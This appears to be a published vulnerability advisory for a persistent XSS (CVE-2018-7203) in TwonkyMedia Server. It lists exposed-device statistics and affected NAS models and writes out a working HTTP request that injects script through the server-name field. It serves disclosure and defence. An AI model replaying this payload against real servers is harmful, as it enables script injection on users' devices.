@@ -1,0 +1,115 @@
+---------------------------------------------------------------------
+
+1. About
+
+---------------------------------------------------------------------
+# Exploit Title: TwonkyMedia Server 7.0.11-8.5 Persistent XSS
+# Date: 2018-03-27
+# Exploit Author: Sven Fassbender 
+# Contact: https://twitter.com/mezdanak
+# Vendor Homepage: http://www.lynxtechnology.com/home
+# Software Link: https://twonky.com/downloads/index.html
+# Version: 7.0.11-8.5
+# CVE : CVE-2018-7203
+# Category: webapps
+
+---------------------------------------------------------------------
+
+2. Background information
+
+---------------------------------------------------------------------
+"With Twonky from Lynx Technology, you can quickly discover your media libraries of digital videos, 
+photos and music in your home, control them from mobile devices, and enjoy them on connected screens and speakers.
+
+Twonky Server is the industry leading DLNA/UPnP Media Server from Lynx Technology that enables sharing media content 
+between connected devices. Twonky Server is used worldwide and is available as a standalone server 
+(end user installable, e.g. for PCs/Macs) or an embedded server for devices such as NAS, routers/gateways and STBs.
+
+Twonky Server’s web UI provides optimal capability for you to easily and reliably control and play back your 
+media files in a variety of ways, and to “beam” those media files to other connected devices." --extract from https://twonky.com
+
+Statistics:
+    Around 20800 TwonkyMedia Servers public available listed on shodan.io worldwide. (https://www.shodan.io/search?query=twonky)
+    Rarely protected by password (only around 2%).
+    
+Top Countries:
+	1. United States
+	2. Germany
+	3. Korea
+	4. Russian Federation
+	5. France
+	6. Italy
+	7. Taiwan
+	8. Poland
+	9. Hungary
+	10. United Kingdom
+
+TwonkyMedia Server seems too be pre installed on a huge range of NAS devices. For example the following NAS devices:
+    Thecus N2310
+    Thecus N4560
+    WDMyCloud, 
+    MyCloudEX2Ultra, 
+    WDMyCloudEX4, 
+    WDMyCloudEX2100, 
+    QNAP, 
+    Zyxel NAS326,
+    Zyxel NAS542,
+    Zyxel NSA310, 
+    Zyxel NSA310S,
+    Zyxel NSA320,
+    Zyxel NSA325-v2
+    ...
+
+Other devices:
+    Belkin routers
+    Zyxel EMG2926-Q10A
+    ...
+---------------------------------------------------------------------
+
+3. Vulnerability description
+
+---------------------------------------------------------------------
+TwonkyMedia Server lacks of validating user input in the "Servername" input field. 
+HTTP request:
+	POST /rpc/set_all HTTP/1.1
+	Host: 192.168.188.9:9000
+	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
+	Accept: */*
+	Accept-Language: de,en-US;q=0.7,en;q=0.3
+	Accept-Encoding: gzip, deflate
+	Referer: http://192.168.188.9:9000/webconfig
+	Content-Type: application/x-www-form-urlencoded
+	X-Requested-With: XMLHttpRequest
+	Content-Length: 39
+	Connection: close
+
+	friendlyname=<script>alert(1)</script>
+
+HTTP response:
+	HTTP/1.1 200 OK
+	Content-Type: text/html; charset=utf-8
+	Content-Language: de
+	Content-Length: 30
+	Date: Tue, 19 Dec 2017 04:09:21 GMT
+	Accept-Ranges: bytes
+	Connection: close
+	Expires: 0
+	Pragma: no-cache
+	Cache-Control: no-cache
+	EXT:
+	Server: Linux/2.x.x, UPnP/1.0, pvConnect UPnP SDK/1.0, Twonky UPnP SDK/1.1
+
+	<html><body>ok</body></html>
+
+Now if e.g. http://192.168.188.9:9000 is visited, the injected JavaScript code get's executed.
+
+---------------------------------------------------------------------
+
+4. Fix
+
+---------------------------------------------------------------------
+All TwonkyMedia Server versions between 7.0.11 -> 8.5 have been tested as vulnerable. 
+While writing this advisory 8.5 is the latest version available:
+https://twonky.com/downloads/index.html
+
+---------------------------------------------------------------------
